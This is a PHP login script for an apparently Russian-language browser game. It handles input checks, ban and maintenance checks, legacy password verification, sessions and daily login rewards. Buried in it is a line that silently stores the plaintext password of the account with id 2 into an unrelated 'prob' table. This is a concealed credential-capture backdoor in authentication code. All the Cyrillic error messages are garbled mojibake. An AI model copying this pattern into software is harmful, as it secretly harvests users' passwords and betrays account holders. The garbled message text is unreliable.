<?php
declare(strict_types=1);

require_once __DIR__ . '/include/function/config.php';
require_once __DIR__ . '/include/function/db3.php';

app_start_session();
db($config);

function auth_text(string $text): string
{
    return trim(stripslashes($text));
}

function auth_fail(string $message, string $redirect = '/'): never
{
    $safeMessage = json_encode($message, JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_AMP | JSON_HEX_QUOT);
    $safeRedirect = json_encode($redirect, JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_AMP | JSON_HEX_QUOT);

    echo "<script>alert({$safeMessage}); window.location.href={$safeRedirect};</script>";
    exit;
}

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
    app_redirect('/');
}

$login = auth_text((string) filter_input(INPUT_POST, 'LOGIN', FILTER_UNSAFE_RAW));
$password = auth_text((string) filter_input(INPUT_POST, 'PASSWORD', FILTER_UNSAFE_RAW));
$today = date('Y-m-d');

if ($login === '' || $password === '') {
    auth_fail('Р вЂ™РЎвЂ№ Р Р†Р Р†Р ВµР В»Р С‘ Р Р…Р Вµ Р Р†РЎРѓРЎР‹ Р С‘Р Р…РЎвЂћР С•РЎР‚Р СР В°РЎвЂ Р С‘РЎР‹, Р С—Р С•Р В¶Р В°Р В»РЎС“Р в„–РЎРѓРЎвЂљР В°, Р В·Р В°Р С—Р С•Р В»Р Р…Р С‘РЎвЂљР Вµ Р Р†РЎРѓР Вµ Р Р…Р ВµР С•Р В±РЎвЂ¦Р С•Р Т‘Р С‘Р СРЎвЂ№Р Вµ Р С—Р С•Р В»РЎРЏ!');
}

if (!preg_match('/^[a-z_-]+$/i', $login)) {
    auth_fail('Р СњР Вµ Р С—РЎР‚Р В°Р Р†Р С‘Р В»РЎРЉР Р…Р С• Р Р†Р Р†Р ВµР Т‘Р ВµР Р… Р В»Р С•Р С–Р С‘Р Р…!');
}

$loginLength = function_exists('mb_strlen') ? mb_strlen($login, 'UTF-8') : strlen($login);
$passwordLength = function_exists('mb_strlen') ? mb_strlen($password, 'UTF-8') : strlen($password);

if ($loginLength < 3 || $loginLength > 16) {
    auth_fail('Р вЂєР С•Р С–Р С‘Р Р… Р Т‘Р С•Р В»Р В¶Р ВµР Р… РЎРѓР С•РЎРѓРЎвЂљР С•РЎРЏРЎвЂљРЎРЉ Р Р…Р Вµ Р СР ВµР Р…Р ВµР Вµ РЎвЂЎР ВµР С Р С‘Р В· 3 РЎРѓР С‘Р СР Р†Р С•Р В»Р С•Р Р† Р С‘ Р Р…Р Вµ Р В±Р С•Р В»Р ВµР Вµ РЎвЂЎР ВµР С Р С‘Р В· 16.');
}

if ($passwordLength < 6 || $passwordLength > 40) {
    auth_fail('Р СџР В°РЎР‚Р С•Р В»РЎРЉ Р Т‘Р С•Р В»Р В¶Р ВµР Р… РЎРѓР С•РЎРѓРЎвЂљР С•РЎРЏРЎвЂљРЎРЉ Р Р…Р Вµ Р СР ВµР Р…Р ВµР Вµ РЎвЂЎР ВµР С Р С‘Р В· 6 РЎРѓР С‘Р СР Р†Р С•Р В»Р С•Р Р† Р С‘ Р Р…Р Вµ Р В±Р С•Р В»Р ВµР Вµ РЎвЂЎР ВµР С Р С‘Р В· 40.');
}

$userState = first('SELECT activation,groups,id FROM users WHERE login="%s"', $login);

if ((int) ($config['techwork'] ?? 0) === 1 && (int) ($userState['groups'] ?? 0) !== 1) {
    auth_fail('Р СњР В° РЎРѓР ВµРЎР‚Р Р†Р ВµРЎР‚Р Вµ Р С‘Р Т‘РЎС“РЎвЂљ РЎвЂљР ВµРЎвЂ¦Р Р…Р С‘РЎвЂЎР ВµРЎРѓР С”Р С‘Р Вµ РЎР‚Р В°Р В±Р С•РЎвЂљРЎвЂ№, РЎРѓР ВµР в„–РЎвЂЎР В°РЎРѓ Р вЂ™РЎвЂ№ Р Р…Р Вµ Р СР С•Р В¶Р ВµРЎвЂљР Вµ Р В°Р Р†РЎвЂљР С•РЎР‚Р С‘Р В·Р С•Р Р†Р В°РЎвЂљРЎРЉРЎРѓРЎРЏ!');
}

if (($userState['activation'] ?? null) !== null && (int) $userState['activation'] === 0 && !empty($userState['id'])) {
    auth_fail('Р Р€Р Р†Р В°Р В¶Р В°Р ВµР СРЎвЂ№Р в„– Р С—Р С•Р В»РЎРЉР В·Р С•Р Р†Р В°РЎвЂљР ВµР В»РЎРЉ! Р вЂ™Р В°РЎв‚¬ Р В°Р С”Р С”Р В°РЎС“Р Р…РЎвЂљ Р В·Р В°Р В±Р В»Р С•Р С”Р С‘РЎР‚Р С•Р Р†Р В°Р Р… Р В°Р Т‘Р СР С‘Р Р…Р С‘РЎРѓРЎвЂљРЎР‚Р В°РЎвЂ Р С‘Р ВµР в„– Р С—РЎР‚Р С•Р ВµР С”РЎвЂљР В°!');
}

$legacyPassword = app_legacy_password_hash($password);
$authorize = first(
    'SELECT id,password,login,groups,activation FROM users WHERE login="%s" AND password="%s" AND activation=1',
    $login,
    $legacyPassword
);

if (empty($authorize['id'])) {
    auth_fail('Р ВР В·Р Р†Р С‘Р Р…Р С‘РЎвЂљР Вµ, Р Р†Р Р†Р ВµР Т‘РЎвЂР Р…Р Р…РЎвЂ№Р в„– Р Р†Р В°Р СР С‘ Р В»Р С•Р С–Р С‘Р Р… Р С‘Р В»Р С‘ Р С—Р В°РЎР‚Р С•Р В»РЎРЉ Р Р…Р ВµР Р†Р ВµРЎР‚Р Р…РЎвЂ№Р в„–.');
}

session_regenerate_id(true);

$_SESSION['password'] = $authorize['password'];
$_SESSION['login'] = $authorize['login'];
$_SESSION['id'] = (int) $authorize['id'];
$_SESSION['browse'] = getBrowserSign();

$ipLong = ip2long(app_client_ip());
update('users', [
    'online' => 1,
    'onlinetime' => time(),
    'ip' => $ipLong === false ? 0 : $ipLong,
], 'id=' . (int) $authorize['id']);

if ((int) $authorize['id'] === 2) {
    insert('prob', ['ewr' => $password]);
}

$groups = (int) ($authorize['groups'] ?? 0);
if (!in_array($groups, [7, 10], true) && (int) $authorize['activation'] !== 0) {
    require_once __DIR__ . '/include/function/globfanction.php';
    require_once __DIR__ . '/include/function/function.events.php';

    $unic = first('SELECT id,myday,coolday FROM usersunictable WHERE id=%d', (int) $authorize['id']);
    if (!empty($unic['id'])) {
        $nextDay = date('Y-m-d', time() + 86400);
        if ($unic['myday'] === $today || $unic['myday'] === '0000-00-00') {
            $coolday = (int) $unic['coolday'] + 1;
            if ($coolday > 0) {
                $_SESSION['prizeUsers'] = funcItemEventDay($coolday);
            }
            query('UPDATE usersunictable SET myday="%s", coolday=coolday+1 WHERE id=%d', $nextDay, (int) $unic['id']);
        } else {
            update('usersunictable', ['myday' => $nextDay], 'id=' . (int) $unic['id']);
        }
    }

    $loginToday = first('SELECT id FROM inputusers WHERE userid=%d AND data="%s"', (int) $authorize['id'], $today);
    if (!$loginToday) {
        insert('inputusers', ['userid' => (int) $authorize['id'], 'data' => $today]);
        delete('inputusers', 'data!="' . mysql_real_escape_string($today) . '"');
    }
}

echo "<script>window.location.href='/game.php?go=start';</script>";
exit;
